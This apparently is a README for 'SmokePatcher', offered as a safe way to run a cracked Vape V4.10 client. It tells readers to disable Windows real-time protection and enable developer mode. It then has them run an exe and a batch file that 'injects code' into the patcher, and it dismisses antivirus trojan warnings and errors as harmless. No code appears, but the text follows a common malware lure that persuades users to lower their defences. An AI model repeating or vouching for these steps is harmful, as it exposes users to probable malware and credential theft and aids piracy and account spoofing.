Kangaroo Patcher was exposed for being a virus! SmokePatcher is a 100% safe patcher that you can use to execute Vape V4.10 as of 2023

HOW TO INSTALL-----

-> MAKE SURE YOUR REAL TIME PROTECTION ON WINDOWS IS SET TO OFF. WHY?

VAPEV4-START.BAT INJECTS CODE INTO SMOKEPATCHER TO RUN THE INSTALLER FOR THE CRACK! THIS CAN MISLEAD ANY ANTIVIRUS SOFTWARE INTO THINKING THIS IS A TROJAN! SMOKE PATCHER IS NOT A TROJAN AND 100% SAFE. IF YOU DONT WANT TO USE SMOKE PATCHER YOU DONT NEED TO :D
-> TURN ON DEVELOPER MODE

YOU WILL NEED DEVELOPER MODE ON IN ORDER TO RUN THE APP ( GO TO SEARCH BAR AND TYPE DEVELOPER MOD SETTINGS, ENABLE DEV MODE)
-> INSTALL THE EXE FILE.

NOW INSTALL THE ZIP FOLDER AND EXTRACT IT. RUN THE SMOKE PATCHER SO IT CAN RUN IN BG AND THEN CLICK ON VAPEV4-START.BAT THIS WILL INJECT THE INSTALLER CODE INTO SMOKE PATCHER AND INSTALL ALL THE FILES USED IN VAPE CLIENT. IT WILL ALSO SPOOF TEMPMAIL EMAIL TO RUN VAPE CLIENT EMAIL SO YOU CAN LOGIN
-> ERROR'S AND HOW TO FIX

ERROR WINDOWS X40400 - THIS ERROR IS FINE AS IT DOESN'T INDICATE ANYTHING!
THIS APP CANT RUN ON YOUR PC - ONCE YOU ARE DONE INSTALLING AND YOU CLICK ON VAPE CLIENT EXE FILE, FOR SOME PEOPLE IT MIGHT SAY THIS! TO FIX THIS ISSUE REINSTALL THIS REP AND THEN FOLLOW THE PROCESS AGAIN. THIS HAPPENS BECAUSE THE PROGRAM HAS NOT BEEN INSTALLED CORRECTLY!
